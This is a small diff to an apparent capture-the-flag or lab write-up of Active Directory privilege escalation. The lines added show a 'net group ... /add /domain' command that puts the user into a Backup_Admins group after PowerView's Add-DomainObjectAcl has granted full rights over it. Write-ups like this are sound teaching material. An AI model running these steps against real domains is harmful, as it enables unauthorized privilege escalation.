@@ -570,6 +570,13 @@ PS C:\Users\claire\Desktop> Add-DomainObjectAcl -Rights 'All' -TargetIdentity "B
 Now i should have GenericAll over the group now i can add myself to it
 
 ```python
+PS C:\Users\claire\Desktop> net group "Backup_Admins" claire /add /domain                                                       
+The command completed successfully.
+```
+Now im in the group
+
+```python
+
 ```
 
 
